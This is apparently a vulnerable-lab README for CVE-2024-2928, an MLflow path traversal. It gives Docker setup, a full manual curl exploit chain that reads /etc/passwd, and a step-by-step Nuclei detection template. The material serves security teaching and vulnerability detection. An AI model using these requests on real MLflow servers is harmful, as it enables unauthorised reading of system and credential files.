

# CVE-2024-2928 - MLflow < 2.11.3 - Path Traversal

## Description

MLflow versions prior to `2.11.3` are vulnerable to a **Path Traversal** vulnerability due to improper handling of URI fragments in artifact locations. An attacker can exploit this to read arbitrary files from the server, including sensitive files like `/etc/passwd`.


## References:

* [NVD CVE Details](https://nvd.nist.gov/vuln/detail/CVE-2024-2928)
* [Exploit Code](https://github.com/nuridincersaygili/CVE-2024-2928/blob/main/CVE-2024-2928.py)
* [Nuclei Official Template](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-2928.yaml)


## Lab Setup

> Requires Docker installed

```bash
docker-compose up -d
```

The vulnerable MLflow application will run on:

```bash
http://<your-docker-ip>:5000
```


## Nuclei Command

```bash
nuclei -u http://192.168.1.172:5000 -t CVE-2024-2928.yaml
```

![6](https://github.com/user-attachments/assets/b106e672-0357-401a-9f54-a1a0dce74560)


# Exploitation Steps (Manual)

1. Create experiment with artifact location as /etc/:
```
curl -s -X POST http://192.168.1.172:5000/ajax-api/2.0/mlflow/experiments/create \
  -H "Content-Type: application/json" \
  -d '{
        "name": "exploit123",
        "artifact_location": "http:///#/../../../../../../../../../../../../../..//etc/"
      }'
```

 - You should get experiment_id: 7 (for example)

![1](https://github.com/user-attachments/assets/a5775a67-5c5c-49c1-8dd3-dcdeaa047a22)


2. Create run: (experiment_id request according change)

```
curl -s -X POST http://192.168.1.172:5000/api/2.0/mlflow/runs/create \
  -H "Content-Type: application/json" \
  -d '{"experiment_id": "7"}'
```
 - Note the run_id returned. Let's say: 3cfc250090b246b68f34fb2dfa42ba0e

![2](https://github.com/user-attachments/assets/a333cf1a-ee4e-45c5-80a7-bf7fb56859ea)


3. Register model:

```
curl -s -X POST http://192.168.1.172:5000/ajax-api/2.0/mlflow/registered-models/create \
  -H "Content-Type: application/json" \
  -d '{"name": "exploit123"}'
```

![3](https://github.com/user-attachments/assets/b4ce8dc5-9988-4e2a-863e-6be97f0d65c0)


4. Create model version using directory as source: (Chage run_id according to request)

```
curl -s -X POST http://192.168.1.172:5000/ajax-api/2.0/mlflow/model-versions/create \
  -H "Content-Type: application/json" \
  -d '{
        "name": "exploit123",
        "run_id": "3cfc250090b246b68f34fb2dfa42ba0e",
        "source": "file:///etc/"
      }'
```

 - This should now succeed because /etc/ matches the artifact path.

![4](https://github.com/user-attachments/assets/de0fc4dd-d916-4abf-a868-581c8d01f4a6)


5. Fetch /etc/passwd

```
curl -s "http://192.168.1.172:5000/model-versions/get-artifact?path=passwd&name=exploit1234&version=1"
```

![5](https://github.com/user-attachments/assets/ebe32ed1-2ad8-48c9-b316-c8a73fcf3b1a)


# Steps to Write Nuclei Template

### **HTTP Requests**

```yaml
http:
  - raw:
      - |
        POST /ajax-api/2.0/mlflow/experiments/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "{{randstr}}", "artifact_location": "http:\/\/\/#\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/"}
```

ðŸ”¹ **Creates a new experiment** in MLflow.

ðŸ”¹ The `"artifact_location"` includes **directory traversal** using `../../../` to reach `/etc/`.



```yaml
      - |
        POST /api/2.0/mlflow/runs/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"experiment_id": "{{EXPERIMENT_ID}}"}
```

ðŸ”¹ Creates a **run** under the experiment.

ðŸ”¹ Uses the ID extracted from the first request (`EXPERIMENT_ID`).


```yaml
      - |
        POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "{{randstr}}"}
```

ðŸ”¹ Creates a **registered model**. The name is randomly generated.


```yaml
      - |
        POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "{{randstr}}", "run_id": "{{RUN_ID}}", "source": "file:///etc/"}
```

ðŸ”¹ Registers a **model version** using a `file:///etc/` path â€” aiming to fetch files from the server filesystem.

ðŸ”¹ Uses `run_id` extracted earlier.


```yaml
      - |
        GET /model-versions/get-artifact?path=passwd&name={{randstr}}&version=1 HTTP/1.1
        Host: {{Hostname}}
```

ðŸ”¹ **Final payload** to extract the actual file `/etc/passwd` using `get-artifact`.

ðŸ”¹ `passwd` is passed as the path argument to download sensitive file content.


### **Matchers (Detecting Success)**

```yaml
matchers-condition: and
matchers:
  - type: regex
    part: body_5
    regex:
      - "root:.*:0:0:"
```

 Checks if `/etc/passwd` file content is present by matching typical `/etc/passwd` lines like `root:x:0:0:`.

```yaml
  - type: word
    part: header_5
    words:
      - "filename=passwd"
      - "application/octet-stream"
    condition: and
```

 Ensures server responded with:

* A downloadable file named `passwd`
* Content type is `application/octet-stream`


```yaml
  - type: status
    status:
      - 200
```

 Confirms HTTP 200 (OK) response.


### **Extractors (Capturing Dynamic Values)**

```yaml
  - type: json
    part: body_1
    name: EXPERIMENT_ID
    group: 1
    json:
      - '.experiment_id'
    internal: true
```

 Extracts `experiment_id` after the experiment creation.

```yaml
  - type: json
    part: body_2
    name: RUN_ID
    group: 1
    json:
      - '.run.info.run_id'
    internal: true
```

Extracts `run_id` from the run creation response.





